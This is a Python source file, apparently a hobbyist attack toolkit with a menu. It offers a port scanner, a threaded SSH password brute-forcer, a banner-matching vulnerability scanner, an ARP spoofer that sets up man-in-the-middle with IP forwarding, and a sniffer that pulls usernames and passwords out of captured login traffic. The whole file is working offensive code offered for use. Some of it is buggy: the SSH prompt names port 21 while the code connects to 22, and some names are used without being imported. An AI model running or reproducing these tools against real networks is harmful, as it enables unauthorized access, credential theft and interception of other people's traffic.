import os
from termcolor import colored
c = colored
# /home/kali/Desktop/Gathered_Information/lists/vuln.txt

def quitit():
	print(c("[----] Are you sure you want to leave?", "red"))
	print(c("[----] 1", "red"))
	print(c("[----] 2", "green"))
	gatto = int(input(c("[----] Type 1 to exit; 2 to continue: ")))
	if gatto == 1:
		os.system("clear")
		exit(0)
	elif gatto == 2:
		os.system("clear")
		begin()

print(c("             _ _   _______          _      ", "green"))
print(c("       /\   | | | |__   __|        | |     ", "green"))
print(c("      /  \  | | |    | | ___   ___ | |___  ", "green"))
print(c("     / /\ \ | | |    | |/ _ \ / _ \| / __| ", "green"))
print(c("    / ____ \| | |    | | (_) | (_) | \__ \ ", "green"))
print(c("   /_/    \_\_|_|    |_|\___/ \___/|_|___/ ", "green"))
print(" <<<<<----->= All Tools By: IAmFalseBeliefs <=----->>>>>")
print("<<<<<----->=          Ports Made Easy         <=----->>>>>")
print("\n")

print(c("[----] Port scanner [1]", "blue"))
print(c("[----] SSH Brute force [2]", "green"))
print(c("[----] Vulnerablility Scanner [3]", "cyan"))
print(c("[----] ARP Spoofer [4]", "yellow"))
print(c("[----] Password Sniffer [5]", "magenta"))
print(c("[----] Clear your screen [6]", "white"))
print(c("[----] Exit [7]", "red"))
choice = int(input(c("Chose an option: ", "white")))
print("\n")

class PortScan():

	banners = []
	open_ports = []

	def __init__(self, target, port_num):
		self.target = target
		self.port_num = port_num

	def scan(self):
		for port in range(1, 1000):
			self.scan_port(port)

	def check_ip(self):
		try:
			IP(self.target)
			return(self.target)
		except ValueError:
			return socket.gethostbyname(self.target)

	def scan_port(self, port):
		try:
			converted_ip = self.check_ip()
			sock = socket.socket()
			sock.settimeout(0.5)
			sock.connect((converted_ip, port))
			self.open_ports.append(port)
			try:
				banner = sock.recv(1024).decode().strip("\n").strip("\r")
				self.banners.append(banner)
			except:
				self.banners.append(" ")

			sock.close()
				
		except:
			pass

def begin():
	print(c("             _ _   _______          _      ", "green"))
	print(c("       /\   | | | |__   __|        | |     ", "green"))
	print(c("      /  \  | | |    | | ___   ___ | |___  ", "green"))
	print(c("     / /\ \ | | |    | |/ _ \ / _ \| / __| ", "green"))
	print(c("    / ____ \| | |    | | (_) | (_) | \__ \ ", "green"))
	print(c("   /_/    \_\_|_|    |_|\___/ \___/|_|___/ ", "green"))
	print(" <<<<<----->= All Tools By: IAmFalseBeliefs <=----->>>>>")
	print("<<<<<----->=          Ports Made Easy         <=----->>>>>")
	print("\n")

	print(c("[----] Port scanner [1]", "blue"))
	print(c("[----] SSH Brute force [2]", "green"))
	print(c("[----] Vulnerablility Scanner [3]", "cyan"))
	print(c("[----] ARP Spoofer [4]", "yellow"))
	print(c("[----] Password Sniffer [5]", "magenta"))
	print(c("[----] Clear your screen [6]", "white"))
	print(c("[----] Exit [7]", "red"))
	choice = int(input(c("Chose an option: ", "white")))
	print("\n")
	if choice == 1:
		os.system("clear")
		pscanner123()
	elif choice == 2:
		os.system("clear")
		sbrute()
	elif choice == 3:
		os.system("clear")
		vulnb()
	elif choice == 4:
		os.system("clear")
		asp()
	elif choice == 5:
		os.system("clear")
		passniff()
	elif choice == 6:
		os.system("clear")
		begin()
	elif choice == 7:
		os.system("clear")
		quitit()

def pscanner123():
	print("\n")
	print(c("[----] Continue using SSH-Brute [1]", "green"))
	print(c("[----] Go back to main screen [2]", "red"))
	option1 = int(input(c("[----] Chose an option: ")))
	if option1 == 2:
		os.system("clear")
		begin()
	elif option1 == 1:
		import socket
		from IPy import IP

		print(c("     _____           __     _____                                  ", "green"))
		print(c("    |  __ \         | |    / ____|                                 ", "white"))
		print(c("    | |__) |__  _ __| |_  | (___   ___ __ _ _ __  _ __   ___ _ __  ", "blue"))
		print(c("    |  ___/ _ \| '__| __|  \___ \ / __/ _` | '_ \| '_ \ / _ \ '__| ", "red"))
		print(c("    | |  | (_) | |  | |_   ____) | (_| (_| | | | | | | |  __/ |    ", "yellow"))
		print(c("    |_|   \___/|_|   \__| |_____/ \___\__,_|_| |_|_| |_|\___|_|    ", "white"))  
		print("\n")
		print("     <<<<<----->= Port Scanner By: IAmFalseBeliefs <=----->>>>>")
		print("     <<<<<----->=          Ports Made Easy         <=----->>>>>")
		print("<<<<<----->= Use NMAP to find version of service running <=----->>>>>")
		print("\n")

		def check_ip(ip):
			try:
				IP(ip)
				return(ip)
			except ValueError:
				return socket.gethostbyname(ip)

		def get_banner(s):
			return s.recv(1024)

		def scan_port(ipaddress, port):
			try:
				sock = socket.socket()
				sock.settimeout(float(speed))
				sock.connect((ipaddress, port))
				try:
					banner = get_banner(sock)
					print(c("[----] Port " + str(port) + " is open <-----> running " + str(banner.decode().strip("\n")), "green"))
				except:
					print(c("[----] Port " + str(port) + " is open <-----> No Banner Avaliable", "cyan"))
			except:
				pass

		targets = input("[----] Enter URL or IP address to scan (Split multiple targets by coma): ")
		speed = input("[----] Enter speed (suggested 0.5 for most acuracy): ")
		range1 = input("[----] Please put number of begining port (ie. 80): ")
		range2 = int(input("[----] Please put number of ending port (ie. 100): "))
		range2 += 1

		def scant(target):
			converted_ip = check_ip(target)
			print("\n " + "     <<<<<----->= Scanning " + str(target) + " <=----->>>>>")
			for port in range(int(range1), int(range2)):
				scan_port(converted_ip, port)

		if "," in targets:
			for ip_add in targets.split(","):
				scant(ip_add.strip(" "))
		else:
			scant(targets)

def sbrute():
	print("\n")
	print(c("[----] Continue using SSH-Brute [1]", "green"))
	print(c("[----] Go back to main screen [2]", "red"))
	option1 = int(input(c("[----] Chose an option: ")))
	if option1 == 2:
		os.system("clear")
		begin()
	elif option1 == 1:
		import paramiko, sys, os, socket, termcolor
		import threading, time
		stop_flag = 0
		print(c("       _____ _____ _    _            ____             _        ", "green"))
		print(c("      / ____/ ____| |  | |          |  _ \           | |       ", "blue"))
		print(c("     | (___| (___ | |__| |  ______  | |_) |_ __ _   _| |_ ___  ", "white"))
		print(c("      \___ \ ___ \|  __  | |______| |  _ <| '__| | | | __/ _ \ ", "red"))
		print(c("      ____) |___) | |  | |          | |_) | |  | |_| | ||  __/ ", "yellow"))
		print(c("     |_____/_____/|_|  |_|          |____/|_|   \__,_|\__\___| ", "magenta"))
		print("   <<<<<----->= SSH Brute Forcer By: IAmFalseBeliefs <=----->>>>>")
		print("     <<<<<----->=          Brutes Made Easy         <=----->>>>>")
		print(c("<<<<<----->= Use my PortScanner to see if ssh is open <=----->>>>>", "blue"))
		print(c("     <<<<<----->= I used multi-threading for this <=----->>>>>", "yellow"))
		print("\n")

		host = input("[----] Target IP address (SSH port 21): ")
		username = input("[----] Target Username (SSH port 21): ")
		pass_file = input("[----] Password file path: ")
		print("[----] Attempting brute force on " + username + " on host: " + host)

		def ssh_connect(password, code = 0):
			global stop_flag
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

			try:
				ssh.connect(host, port = 22, username = username, password = password)
				stop_flag = 1
				print(c("[----] Brute complete use password: " + password + " for Account: " + username, "green"))
			except:
				print(c("[----] Incorrect password: " + password, "red"))
			ssh.close()

		if os.path.exists(pass_file) == False:
			print("[=--=] Check spelling, file doesnt exist")
			sys.exit(1)

		with open(pass_file, 'r') as file:
			for line in file.readlines():
				if stop_flag == 1:
					t.join()
					exit()
				password = line.strip()
				t = threading.Thread(target = ssh_connect, args = (password,))
				t.start()
				time.sleep(0.5)

def vulnb():
	print("\n")
	print(c("[----] Continue using Vuln-Ture [1]", "green"))
	print(c("[----] Go back to main screen [2]", "red"))
	option1 = int(input(c("[----] Chose an option: ")))
	if option1 == 2:
		os.system("clear")
		begin()
	elif option1 == 1:
		import portscan2
		print(c("   __      __    _                  _                   ", "red"))
		print(c("   \ \    / /   | |                | |                  ", "green"))
		print(c("    \ \  / /   _| |_ __    ______  | |_ _   _ _ __ ___  ", "magenta"))
		print(c("     \ \/ / | | | | '_ \  |______| | __| | | | '__/ _ \ ", "red"))
		print(c("      \  /| |_| | | | | |          | |_| |_| | | |  __/ ", "green"))
		print(c("       \/  \__,_|_|_| |_|           \__|\__,_|_|  \___| ", "red"))
		print("<<<<<----->= Vulnerablity Scanner By: IAmFalseBeliefs <=----->>>>>")
		print("    <<<<<----->=          Ports Made Easy         <=----->>>>>")
		print("\n")         

		targets_ip = input("[----] Enter target to scan for vulnerable ports: ")
		port_number = int(input("[----] Enter port number to scan to (500 is from port 1 to 500): "))
		vulnfile = input("[----] Enter path to file with vulnerable softwares: ")
		print("\n")

		target = portscan2.PortScan(targets_ip, port_number)
		target.scan()

		with open(vulnfile, "r") as file:
			count = 0
			for banner in target.banners:
				file.seek(0)
				for line in file.readlines():
					if line.strip() in banner:
						print(c("[----] Vulnerable Banner: " + banner + "On Port: " + str(target.open_ports[count]), "green"))
				count += 1

def asp():
	print(c("[----] Continue using Arpoof [1]", "green"))
	print(c("[----] Go back to main screen [2]", "red"))
	option1 = int(input(c("[----] Chose an option: ")))
	if option1 == 2:
		os.system("clear")
		begin()
	elif option1 == 1:
		import scapy.all
		import sys
		import time
		print(c("                                                             __  ", "red"))
		print(c("                               /\                           / _| ", "yellow"))
		print(c("                              /  \   _ __ _ __   ___   ___ | |_  ", "green"))
		print(c("                             / /\ \ | '__| '_ \ / _ \ / _ \   _| ", "cyan"))
		print(c("                            / ____ \  |  | |_) | (_) | (_) | |   ", "magenta"))
		print(c("                           /_/    \_\_|  | .__/ \___/ \___/|_|   ", "red"))
		print(c("                                         | |                     ", "yellow"))
		print(c("                                         |_|                     ", "green"))
		print("               <<<<<----->= Arp Spoofer By: IAmFalseBeliefs <=----->>>>> ")
		print("                   <<<<<----->= IP Addresses made easy <=----->>>>> ")
		print(" <<<<<----->= exit this and type, \"echo 1 >> /proc/sys/net/ipv4/ip_forward\" <=----->>>>>")
		print("\n")
	
		def get_mac_address(ip_address):
			broadcats_layer = scapy.layers.l2.Ether(dst="ff:ff:ff:ff:ff:ff")
			arp_layer = scapy.layers.l2.ARP(pdst = ip_address)
			get_mac_packet = broadcats_layer/arp_layer
			answer = scapy.sendrecv.srp(get_mac_packet, timeout = 2, verbose = False)[0]
			return answer[0][1].hwsrc

		def spoof(router_ip, target_ip, router_mac, target_mac):
			routerpac = scapy.layers.l2.ARP(op = 2, hwdst = router_mac, pdst = router_ip, psrc = target_ip)
			targpac = scapy.layers.l2.ARP(op = 2, hwdst = target_mac, pdst = target_ip, psrc = router_ip)
			scapy.sendrecv.send(routerpac)
			scapy.sendrecv.send(targpac)

		target_ip = input("[----] Enter target's IP address to spoof to: ")
		router_ip = input("[----] Enter router's IP address to send ARP packets to: ")
		print("\n")

		target_mac = str(get_mac_address(target_ip))
		router_mac = str(get_mac_address(router_ip))

		try:
			while True:
				spoof(router_ip, target_ip, router_mac, target_mac)
				time.sleep(2)

		except KeyboardInterrupt:
			print(c("[----] Closing ARP Spoofer", "red"))
			exit(0)

def passniff():
	print("\n")
	print(c("[----] Continue using Passniff [1]", "green"))
	print(c("[----] Go back to main screen [2]", "red"))
	option1 = int(input(c("[----] Chose an option: ")))
	if option1 == 2:
		os.system("clear")
		begin()
	elif option1 == 1:
		import scapy.all
		from urllib import parse
		import re
		print(c("             _____                    _  __  __  ", "red"))
		print(c("            |  __ \                  (_)/ _|/ _| ", "red"))
		print(c("            | |__) |_ _ ___ ___ _ __  _| |_| |_  ", "red"))
		print(c("            |  ___/ _` / __/ __| '_ \| |  _|  _| ", "red"))
		print(c("            | |  | (_| \__ \__ \ | | | | | | |   ", "red"))
		print(c("            |_|   \__,_|___/___/_| |_|_|_| |_|   ", "red"))
		print(" <<<<<----->= Password Sniffer By: IAmFalseBeliefs <=----->>>>>")
		print("        <<<<<----->= Passwords made easy <=----->>>>>")
		print("\n")
		
		#iface = input("[----] Enter the Web Interface you have as defualt (ie. eth0; wlan0): ")
		iface = "eth0"

		def get_login_pass(body):
			user = None
			passwd = None

			userfields = ["log", "login", "wpname", "ahd_username", "unickname", "nickname", "user", "alias", "pseudo", "email", "username", "fuserid", "form_loginname", "login_id", "loginid", "session_key", "sessionkey", "pop_login", "uid", "id", "uname", "ulogin", "acctname", "account", "member", "mailaddress", "membername", "login_email", "loginusername", "loginemail", "uin", "sign-in", "usuario"]
			passfields = ["ahd_password", "pass", "password", "passwd", "_password", "session_password", "login_password", "loginpassword", "form_pw", "pw", "userpassword", "user_password", "passwort", "upasswd", "senha", "wppassword", "constrasena"]

			for login in userfields:
				login_re = re.search("(%s=[^&]+)" % login, body, re.IGNORECASE)
				if login_re:
					user = login_re.group()
			for passfield in passfields:
				pass_re = re.search("(%s=[^&]+)" % passfield, body, re.IGNORECASE)
				if pass_re:
					passwd = pass_re.group()

				if user and passwd:
					return(user, passwd)

		def pkt_parser(packet):
			if packet.haslayer(TCP) and packet.haslayer(str(Raw)) and packet.haslayer(IP):
				body = str(packet[TCP].payload)
				user_pass = get_login_pass(body)
				if user_pass != None:
					print(c("[----] Website Login: " + packet[TCP].payload, "green"))
					print(c("[----] Username Found: " + parse.unquote(user_pass[0]), "green"))
					print(c("[----] Password Found: " + parse.unquote(user_pass[1]), "green"))
					
			else:
				pass

		try:
			sniff(iface = iface, prn = pkt_parser, store = 0)
		except KeyboardInterrupt:
			print(c("[----] Exiting", "red"))
			exit(0)
              
if choice == 1:
	os.system("clear")
	pscanner123()
elif choice == 2:
	os.system("clear")
	sbrute()
elif choice == 3:
	os.system("clear")
	vulnb()
elif choice == 4:
	os.system("clear")
	asp()
elif choice == 5:
	os.system("clear")
	passniff()
elif choice == 6:
	os.system("clear")
	begin()
elif choice == 7:
	os.system("clear")
	quitit()        